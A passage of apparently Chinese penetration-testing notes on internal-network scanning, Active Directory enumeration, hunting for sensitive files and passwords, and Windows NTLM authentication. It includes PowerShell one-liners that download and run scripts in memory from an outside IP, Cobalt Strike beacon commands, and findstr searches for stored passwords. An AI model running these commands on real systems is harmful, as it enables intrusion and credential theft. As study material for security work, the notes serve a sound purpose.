poc,以减少流量)</span><br></pre></td></tr></table></figure>\n<p>6.ladon</p>\n<p>Ladon 一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键 GetShell，支持批量 A 段 / B 段 / C 段以及跨网段扫描，支持 URL、主机、域名列表扫描。7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">### 003 网段扫描/批量扫描</span><br><span class=\"line\">CIDR格式：不只是/24/16/8(所有)</span><br><span class=\"line\">Ladon 192.168.1.8/24 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/16 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/8 扫描模块</span><br><span class=\"line\">字母格式：仅C段B段A段 顺序排序</span><br><span class=\"line\">Ladon 192.168.1.8/c 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/b 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/a 扫描模块</span><br><span class=\"line\">TXT格式</span><br><span class=\"line\">##### 004 ICMP批量扫描C段列表存活主机</span><br><span class=\"line\">Ladon ip24.txt ICMP</span><br><span class=\"line\">##### 005 ICMP批量扫描B段列表存活主机</span><br><span class=\"line\">Ladon ip16.txt ICMP</span><br><span class=\"line\">##### 006 ICMP批量扫描cidr列表(如某国IP段)</span><br><span class=\"line\">Ladon cidr.txt ICMP</span><br><span class=\"line\">##### 007 ICMP批量扫描域名是否存活</span><br><span class=\"line\">Ladon domain.txt ICMP</span><br><span class=\"line\">##### 008 ICMP批量扫描机器是否存活</span><br><span class=\"line\">Ladon host.txt ICMP</span><br></pre></td></tr></table></figure>\n<p>还有好多自己找吧</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>1.scanline</p>\n<p>ScanLine 是一款 windows 下的端口扫描的命令行程序。它可以完成 PING 扫描、TCP 端口扫描、UDP 端口扫描等功能。运行速度很快，不需要 winPcap 库支持，应用场合受限较少。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scanline.exe ‐bhpt 21‐23,25,80,110,135‐139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 100.100.0.39</span><br><span class=\"line\">scanline.exe ‐bhpt 80,443 100.100.0.1‐254(IP)</span><br><span class=\"line\">scanline.exe ‐bhpt 139,445 IP</span><br></pre></td></tr></table></figure>\n<p>2.telnet</p>\n<p>Telnet 协议是 TCP/IP 协议族的一员，是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用 Telnet 协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 telnet 命令是最方便的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet 192.168.13.100 3389</span><br></pre></td></tr></table></figure>\n<p>3.readteam tool</p>\n<p>RedTeamTool 中有一个本地端口扫面的工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">portscanx64 0 10000</span><br></pre></td></tr></table></figure>\n<p>4.powerspioit</p>\n<p>PowerSploit 是一款基于 PowerShell 的后渗透框架软件，包含了很多 PowerShell 的攻击脚本，它们主要用于渗透中的信息侦测，权限提升、权限维持等</p>\n<p>本地执行：需要将程序放到目标机上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass Import‐Module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>远程执行：文件不落地执行</p>\n<p>先去指定的地址下载，在执行，只存在于内存中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass ‐c IEX (New‐Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;);import‐module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>5.nishang</p>\n<p>Nishang 是一款针对 PowerShell 的渗透工具。</p>\n<p>nishang 需要将整个 zip 都上传，不能单独上传某个脚本，因此需要上传 zip 后在服务端解压，也是有工具滴</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//方式一</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">Import‐Module .\\nishang.psm1 导入模块</span><br><span class=\"line\">Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost</span><br><span class=\"line\"></span><br><span class=\"line\">//以下命令直接运行，不需要导入别的东西，方式二</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost &#125;&quot;</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost -ScanPort -Port 445 &#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//方式三</span><br><span class=\"line\">将powershell脚本放在cs目录下</span><br><span class=\"line\">powershell‐import nishang\\nishang.psm1    //后面的路径为cs中上传的物理路径</span><br><span class=\"line\">powershell Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost </span><br></pre></td></tr></table></figure>\n<p>5.fscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>6.kscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>7.london</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<h3 id=\"收集域环境信息\"><a class=\"markdownIt-Anchor\" href=\"#收集域环境信息\">#</a> 收集域环境信息</h3>\n<p>1. 权限查询</p>\n<p>四种用户</p>\n<blockquote>\n<p>本地普通用户 PC2008\\haha</p>\n<p>本地管理员用户 PC-2008\\administrator</p>\n<p>域内用户 hack\\zhangsan</p>\n<p>域管用户  hack\\administrator</p>\n</blockquote>\n<p>如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息.</p>\n<p>而本地管理员用户和域内用户可以查询域内信息.</p>\n<p>本地管理员 Admmistrator 权限可以直接提升为 Ntauthority 或 System 权限，因此，在域中，除普通用户外，所有的机器都有 — 个机器用户（用户名是机器名加上 &quot;$&quot;）。在本质上，<strong> 机器的 system 用户对应的就是域里面的机器用户</strong></p>\n<h4 id=\"判断域方法\"><a class=\"markdownIt-Anchor\" href=\"#判断域方法\">#</a> 判断域方法</h4>\n<p>1.ipconfig /all</p>\n<blockquote>\n<p>主 dns 后缀</p>\n<p>通过 nslookup 查询该后缀，可以得到域控</p>\n</blockquote>\n<p>2.systeminfo</p>\n<blockquote>\n<p>域:hack.com</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> config workstation</p>\n<blockquote>\n<p>工作站域 DNS 名称</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> time /domain</p>\n<blockquote>\n<p>1,2 都代表存在域</p>\n</blockquote>\n<p>1. 存在域，但当前用户不是域用户</p>\n<p>​\t系统错误 5，本地 administrator 是此效果，但提权后，变为第二种现象</p>\n<p>2. 存在域，并且当前用户是域用户</p>\n<p>​\thack.com 当前时间</p>\n<p>3. 当前网络环境为工作组，不存在域</p>\n<p>​\t找不到域控</p>\n<p>降权 - system 变为 administrator 去执行一些命令，计划任务，net localgroup</p>\n<p>提权 - administrator 变为 system 变为域用户</p>\n<p>添加本地管理员的方法：在本地加，在域里面的 domain admins 组加</p>\n<h4 id=\"查询域\"><a class=\"markdownIt-Anchor\" href=\"#查询域\">#</a> 查询域</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net view /domain:xxx     //域内计算机</span><br><span class=\"line\">net group /domain   //查询用户列表</span><br><span class=\"line\">net group &quot;domain admins&quot;/domain   //查询用户列表</span><br><span class=\"line\">nltest /domain_trusts  //获取域信任信息，为后续跨域 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"找域控\"><a class=\"markdownIt-Anchor\" href=\"#找域控\">#</a> 找域控</h3>\n<p>1.nltest /DCLIST:hack</p>\n<blockquote>\n<p>在使用 ping 或者 nslookup 解析域控的 IP</p>\n</blockquote>\n<p>2. 查看域控主域名</p>\n<blockquote>\n<p><code>nslookup ‐type=SRV _ldap._tcp</code></p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> time /domain</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> group “Domain Controllers” /domain</p>\n<h3 id=\"获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#获取用户信息\">#</a> 获取用户信息</h3>\n<p>1. 查询域内用户</p>\n<p>net user /domain</p>\n<p>2. 获取域内用户详细信息</p>\n<p><code>wmic</code></p>\n<blockquote>\n<p>wmic /?</p>\n<p>wmic user account get all</p>\n<p>wmic useraccount get name</p>\n<blockquote>\n<p>C:\\Users\\18310&gt;wmic useraccount get name<br>\nName<br>\n18310<br>\nAdministrator<br>\nDefaultAccount<br>\nGuest<br>\nhahaha<br>\nmysql<br>\nVUSR_LAPTOP-8A2UNITB<br>\nWDAGUtilityAccount<br>\nwww</p>\n</blockquote>\n<p>wmic useraccount get domain,name</p>\n</blockquote>\n<p>2. 查看存在用户</p>\n<blockquote>\n<p>dsquery</p>\n<p>dsquery user</p>\n<p>dsquery computer</p>\n</blockquote>\n<p>3. 查域管</p>\n<blockquote>\n<p>net group “domain admins” /domain</p>\n<p>net group “Enterprise Admins” /domain</p>\n</blockquote>\n<h3 id=\"定位域管\"><a class=\"markdownIt-Anchor\" href=\"#定位域管\">#</a> 定位域管</h3>\n<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限，也就是说，当目机被添加到城中。成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限判断域内机器有谁登陆过，或者谁正在登陆，为后续获取 hash 或明文密码，横向传递做铺垫</p>\n<p>1. 通过 psloggedon.exe</p>\n<blockquote>\n<p>PsLoggedon.exe ahzngsan   // 用户登录过那些机器</p>\n<p>PsLoggedon.exe \\\\PC-2003   // 机器被哪些用户登陆过</p>\n</blockquote>\n<p>2.PVEDFindADUser.exe 工具</p>\n<p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要具有.NETFramework 2.0，并且需要具有管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‐h：显示帮助信息</span><br><span class=\"line\">‐current[&quot;username&quot;]：如果仅指定‐current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示该用户登录的计算机</span><br><span class=\"line\">‐last[&quot;username&quot;]：如果仅指定‐last参数，将获取目标计算机上最后一个登录用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户</span><br><span class=\"line\">名，此时使用该工具可能无法得到用户名</span><br><span class=\"line\">‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令</span><br><span class=\"line\">‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名</span><br><span class=\"line\">列表由逗号分隔</span><br><span class=\"line\">直接运行&quot;pvefindaduser.exe ‐current&quot;，即可显示域中所有计算机上当前登录的用户</span><br></pre></td></tr></table></figure>\n<p>3.netview.exe</p>\n<p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登陆会话，利 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe 的绝大部分功能不需要管理员权限就可以使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用语法：</span><br><span class=\"line\">netview.exe &lt;参数&gt;</span><br><span class=\"line\">‐h：显示帮助菜单。</span><br><span class=\"line\">‐f filename.txt：指定从中提取主机列表的文件。</span><br><span class=\"line\">‐e filename.txt：指定要排除的主机名文件。</span><br><span class=\"line\">‐o filename.txt：将所有输出重定向到文件。</span><br><span class=\"line\">‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。</span><br><span class=\"line\">‐g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</span><br><span class=\"line\">‐c：检查对已找到共享的访问权限。</span><br></pre></td></tr></table></figure>\n<p>4.NSE</p>\n<p>如果存在域账户或者本地账户就可以使用 Nmap 的 smb-enum-sessions.nes 引擎获取远程机器的登录会话（不需要管理员权限）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smb‐enum‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span><br><span class=\"line\">smb‐enum‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这</span><br><span class=\"line\">个脚本对域控制器进行扫描</span><br><span class=\"line\">smb‐enum‐shares：遍历远程主机的共享目录</span><br><span class=\"line\">smb‐enum‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span><br><span class=\"line\">smb‐enum‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class=\"line\">smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、</span><br></pre></td></tr></table></figure>\n<p>5.powerview</p>\n<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">powershell.exe ‐exec bypass ‐command &quot;&amp; &#123; import‐module .\\PowerView.ps1;Invoke‐UserHunter&#125;“</span><br></pre></td></tr></table></figure>\n<h3 id=\"powershell\"><a class=\"markdownIt-Anchor\" href=\"#powershell\">#</a> powershell</h3>\n<p>Powershell 一般初始化情况下都会禁止脚本执行。脚本能否执行取决于 Powershell 的执行策略</p>\n<p>Get-ExecutionPolicy 查看权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy </span><br><span class=\"line\">Unrestricted:权限最高，可以不受限制执行任何脚本。</span><br><span class=\"line\">Default:为Powershell默认的策略：Restricted，不允许任何脚本执行。</span><br><span class=\"line\">AllSigned：所有脚本都必须经过签名才能在运行。</span><br><span class=\"line\">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br></pre></td></tr></table></figure>\n<p><strong>PowerSploit</strong></p>\n<p>PowerSploit 是 GitHub 上面的一个安全项目，上面有很多 powershell 攻击脚本，它们主要被用来渗</p>\n<p>透中的信息侦察、权限提升、权限维持。</p>\n<p>Powershell 的优点:</p>\n<p>1. 代码运行在内存中可以不去接触磁盘</p>\n<p>2. 从另一个系统中下载代码并执行</p>\n<p>3. 很多安全产品并不能监测到 powershell 的活动</p>\n<p>4.cmd.exe 通常被阻止运行，但是 powershell 不会</p>\n<p>执行方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell.exe -exec bypass -command &quot;&amp; &#123; import-module C:\\Users\\Administrator\\Desktop\\PowerView.ps1;Get-NetUser&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">python -m http.server 8080</span><br><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/PowerView.ps1&#x27;);import-module .\\PowerView.ps1;Get-NetShare</span><br><span class=\"line\"></span><br><span class=\"line\">beacon&gt; powershell-import //导入各种powershell脚本</span><br><span class=\"line\">beacon&gt;powershell posershell脚本名 //执行脚本</span><br><span class=\"line\">beacon&gt; powershell Check-VM //执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>Nishang</strong></p>\n<p>Nishang 是一款针对 PowerShell 的渗透工具。</p>\n<p>查看模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell Import-Module .\\nishang\\nishang.psm1;Get-Command -Module nishang</span><br></pre></td></tr></table></figure>\n<p>远程执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import nishang\\nishang.psm1</span><br><span class=\"line\">powershell 命令</span><br></pre></td></tr></table></figure>\n<h3 id=\"定位敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#定位敏感信息\">#</a> 定位敏感信息</h3>\n<p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。</p>\n<p>资料、数据、文件的定位流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定位内部人事组织结构</span><br><span class=\"line\"></span><br><span class=\"line\">在内部人事组织结构中寻找需要监视的人员</span><br><span class=\"line\"></span><br><span class=\"line\">定位相关人员的机器</span><br><span class=\"line\"></span><br><span class=\"line\">视相关人员存放文档的位置</span><br><span class=\"line\"></span><br><span class=\"line\">列出存放文档的服务器的目录</span><br></pre></td></tr></table></figure>\n<p>重点核心业务机器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">高级管理人员 系统管理人员 财务/人事/业务人员的个人计算机</span><br><span class=\"line\">产品管理系统服务器</span><br><span class=\"line\">办公系统服务器</span><br><span class=\"line\">财务应用系统服务器</span><br><span class=\"line\">核心产品源码服务器（SVN/GIT服务器）</span><br><span class=\"line\">数据库服务器</span><br><span class=\"line\">文件服务器，</span><br><span class=\"line\">共享服务器</span><br><span class=\"line\">电子邮件服务器</span><br><span class=\"line\">网站监控系统服务器</span><br><span class=\"line\">信息安全监控服务器</span><br><span class=\"line\">生产工厂服务器</span><br></pre></td></tr></table></figure>\n<p>敏感信息和敏感文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">站点源码备份文件，</span><br><span class=\"line\">数据库备份文件等等</span><br><span class=\"line\">游览器保存的密码和游览器的cookie</span><br><span class=\"line\">其他用户会话，</span><br><span class=\"line\">3389和ipc$连接记录，</span><br><span class=\"line\">回收站中的信息等等</span><br><span class=\"line\">Windows的无线密码</span><br><span class=\"line\">网络内部的各种账号密码，</span><br><span class=\"line\">包含电子邮箱，V**，FTP等等</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.指定目录下搜集各类敏感文件</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.txt&quot;</span><br><span class=\"line\">dir /a /s /b C:\\&quot;*.xlsx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.md&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.sql&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.pdf&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.docx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.doc&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*conf*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*bak*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pwd*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pass*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*login*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*user*&quot;</span><br><span class=\"line\">2.指定目录下的文件中搜集各种账号密码</span><br><span class=\"line\">findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure>\n<h2 id=\"windows-认证密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#windows-认证密码抓取\">#</a> windows 认证密码抓取</h2>\n<p>windows 认证</p>\n<p>本地</p>\n<p>网络</p>\n<p>kerberos</p>\n<h3 id=\"本地认证-ntlm和lm\"><a class=\"markdownIt-Anchor\" href=\"#本地认证-ntlm和lm\">#</a> 本地认证 - NTLM 和 LM</h3>\n<p>Windows 的登陆密码是储存在系统本地的 SAM 文件中的，在登陆 Windows 的时候，系统会将用户输入的密码与 SAM 文件中的密码进行对比，如果相同，则认证成功</p>\n<p>SAM 文件是位于 % SystemRoot%\\system32\\config\\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160013739.png\" alt=\"image-20221203160013739\"></p>\n<p>Windows 本地认证流程如下：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160134713.png\" alt=\"image-20221203160134713\"></p>\n<p>首先，用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给 lsass 进程，这个过程中会存一份明文密码，将明文密码加密成 NTLM Hash，对 SAM 数据库进行比较认证</p>\n<p>Windows Logon Process（即 winlogon.exe）：是 Windows NT 用户登陆程序，用于管理用户登陆和退出</p>\n<p>LSASS：用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略</p>\n<p>本地认证中用来处理用户输入密码的进程即 lsass.exe, 密码会在这个进程中明文保存，供该进程将密码计算成 NTLMHash 与 sam 进行比对，我们使用 mimikatz 来获取的明文密码，便是在这个进程中读取到的</p>\n<p>Windows 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在 ntds.dit 中，加密后为散列值。 Windows 操作系统中的密码一般由两部分组成，一部分为 LM Hash, 另一部分为 NTLMHash。在 Windows 操作系统中，Hash 的结构通常如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username:RID:LM‐HASH:NT‐HASH</span><br></pre></td></tr></table></figure>\n<p>LM Hash 的全名为 &quot;LAN Manager Hash&quot;, 是微软为了提高 Windows 操作系统的安全性而采 用的散列加密算法，其本质是 DES 加密。尽管 LM Hash 较容易被破解，但为了保证系统的兼容性，Windows 只是将 LM Hash 禁用了 (从 Windows vista 和 Windows Server2008 版本开始，Windows 操作系统默认禁用 LM Hash)。</p>\n<p>LM Hash 明文密码被限定在 14 位以内，也就是说，如果要停止使用 LM Hash, 将用 户的密码设置为 14 位以上即可。如果 LM Hash 被禁用了，攻击者通过工具抓取的 LM Hash 通常 为 “ad3b435b51404eead3b435b51404ee”(表示 LM Hash 为空值或被禁用) NTLM Hash 是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于 MD4 加密算法进行加密的。个人版从 Windows vista 以后，服务器版从 Windows Server 2003 以后，Windows 操作系统的认证方式均为 NTLM Hash 为了解决 LM 加密和身份验证方案中固有的安全弱点，Microsoft 于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。</p>\n<h3 id=\"windows网络认证\"><a class=\"markdownIt-Anchor\" href=\"#windows网络认证\">#</a> Windows 网络认证</h3>\n<p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的，只能是点对点进行信息的传输。举个例子就是，主机 A 想要访问主机 B 上的资源，就要向主机 B 发送一个存在于主机 B 上的一个账户，主机 B 接收以后会在本地进行验证，如果验证成功，才会允许主机 A 进行相应的访问</p>\n<p>NTLM 协议是一种基于 挑战（Chalenge）/ 响应（Response） 认证机制，仅支持 Windows 